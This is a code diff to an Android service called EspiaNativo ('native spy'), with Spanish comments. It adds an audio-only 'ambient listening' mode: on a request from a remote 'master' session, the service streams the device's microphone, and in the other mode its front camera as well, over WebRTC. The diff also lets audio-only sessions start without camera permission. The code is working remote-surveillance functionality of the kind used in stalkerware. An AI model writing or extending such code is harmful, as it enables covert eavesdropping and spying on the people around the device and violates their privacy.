@@ -43,22 +43,25 @@ class EspiaNativo : Service() {
         private const val EXTRA_SECRETO = "secreto"
         private const val EXTRA_SESION = "sesion"
         private const val EXTRA_DEVICE = "device"
+        private const val EXTRA_SOLO_AUDIO = "soloAudio"
         private const val TTL_MS = 10 * 60 * 1000L   // la sesión de espía dura máx 10 min
 
         @Volatile private var factoryInit = false
         @Volatile private var sesionActiva: String? = null
 
-        /** Lanza el streaming nativo para la sesión pedida por el master (desde el latido). */
-        fun iniciar(ctx: Context, secreto: String, sesion: String, device: String) {
+        /** Lanza el streaming nativo para la sesión pedida por el master (desde el latido).
+         *  soloAudio=true → escucha ambiental (sin cámara, más liviano; no necesita permiso de cámara). */
+        fun iniciar(ctx: Context, secreto: String, sesion: String, device: String, soloAudio: Boolean = false) {
             if (!BuildConfig.ES_GUARD) return
             if (secreto.isBlank() || sesion.isBlank()) return
-            if (ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
-                Log.w(TAG, "sin permiso de cámara → no arranca"); return
-            }
+            val permCam = ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
+            val permMic = ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
+            if (soloAudio && !permMic) { Log.w(TAG, "sin permiso de micrófono → no arranca"); return }
+            if (!soloAudio && !permCam) { Log.w(TAG, "sin permiso de cámara → no arranca"); return }
             if (sesion == sesionActiva) return   // ya corriendo esa sesión
             try {
                 val i = Intent(ctx, EspiaNativo::class.java)
-                    .putExtra(EXTRA_SECRETO, secreto).putExtra(EXTRA_SESION, sesion).putExtra(EXTRA_DEVICE, device)
+                    .putExtra(EXTRA_SECRETO, secreto).putExtra(EXTRA_SESION, sesion).putExtra(EXTRA_DEVICE, device).putExtra(EXTRA_SOLO_AUDIO, soloAudio)
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ctx.startForegroundService(i) else ctx.startService(i)
             } catch (e: Throwable) { Log.w(TAG, "no pude arrancar: ${e.message}") }
         }
@@ -76,6 +79,7 @@ class EspiaNativo : Service() {
     private var sesion = ""
     private var device = ""
     private var token = ""
+    private var soloAudio = false
 
     @Volatile private var cerrado = false
     @Volatile private var ofertaAplicada = false
@@ -87,6 +91,7 @@ class EspiaNativo : Service() {
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        soloAudio = intent?.getBooleanExtra(EXTRA_SOLO_AUDIO, false) ?: false
         enPrimerPlano()
         val sec = intent?.getStringExtra(EXTRA_SECRETO) ?: ""
         val ses = intent?.getStringExtra(EXTRA_SESION) ?: ""
@@ -146,18 +151,20 @@ class EspiaNativo : Service() {
                 .createPeerConnectionFactory()
             factory = f
 
-            // cámara frontal (cae a cualquiera si no hay frontal)
-            val enumerator = Camera2Enumerator(applicationContext)
-            val nombres = enumerator.deviceNames
-            val cam = nombres.firstOrNull { enumerator.isFrontFacing(it) } ?: nombres.firstOrNull { enumerator.isBackFacing(it) } ?: nombres.firstOrNull()
-            if (cam == null) { Log.w(TAG, "sin cámaras"); return false }
-            val cap = enumerator.createCapturer(cam, null) ?: return false
-            capturer = cap
-            val sth = SurfaceTextureHelper.create("CaptureThread", egl.eglBaseContext); surfaceHelper = sth
-            val videoSource = f.createVideoSource(false)
-            cap.initialize(sth, applicationContext, videoSource.capturerObserver)
-            cap.startCapture(1280, 720, 24)
-            val vt = f.createVideoTrack("mg_v0", videoSource); vt.setEnabled(true); videoTrack = vt
+            // cámara frontal (cae a cualquiera si no hay frontal) — se omite en modo solo-audio
+            if (!soloAudio) {
+                val enumerator = Camera2Enumerator(applicationContext)
+                val nombres = enumerator.deviceNames
+                val cam = nombres.firstOrNull { enumerator.isFrontFacing(it) } ?: nombres.firstOrNull { enumerator.isBackFacing(it) } ?: nombres.firstOrNull()
+                if (cam == null) { Log.w(TAG, "sin cámaras"); return false }
+                val cap = enumerator.createCapturer(cam, null) ?: return false
+                capturer = cap
+                val sth = SurfaceTextureHelper.create("CaptureThread", egl.eglBaseContext); surfaceHelper = sth
+                val videoSource = f.createVideoSource(false)
+                cap.initialize(sth, applicationContext, videoSource.capturerObserver)
+                cap.startCapture(1280, 720, 24)
+                val vt = f.createVideoTrack("mg_v0", videoSource); vt.setEnabled(true); videoTrack = vt
+            }
 
             val audioSource = f.createAudioSource(MediaConstraints())
             val at = f.createAudioTrack("mg_a0", audioSource); at.setEnabled(true); audioTrack = at
@@ -170,7 +177,7 @@ class EspiaNativo : Service() {
             val peer = f.createPeerConnection(rtc, PcObs()) ?: return false
             pc = peer
             val streamIds = listOf("mg_stream")
-            peer.addTrack(vt, streamIds)
+            videoTrack?.let { peer.addTrack(it, streamIds) }
             peer.addTrack(at, streamIds)
             return true
         } catch (e: Throwable) { Log.e(TAG, "crearMedios", e); return false }
@@ -347,11 +354,9 @@ class EspiaNativo : Service() {
             .setSmallIcon(android.R.drawable.ic_menu_camera).setOngoing(true).build()
         try {
             if (Build.VERSION.SDK_INT >= 30) {
-                var tipo = ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
-                if (Build.VERSION.SDK_INT >= 34 &&
-                    ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED) {
-                    tipo = tipo or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
-                }
+                val micOk = ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
+                var tipo = if (soloAudio) ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE else ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
+                if (!soloAudio && Build.VERSION.SDK_INT >= 34 && micOk) tipo = tipo or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                 startForeground(NOTIF_ID, n, tipo)
             } else startForeground(NOTIF_ID, n)
         } catch (e: Throwable) { Log.e(TAG, "startForeground", e); try { startForeground(NOTIF_ID, n) } catch (_: Throwable) {} }
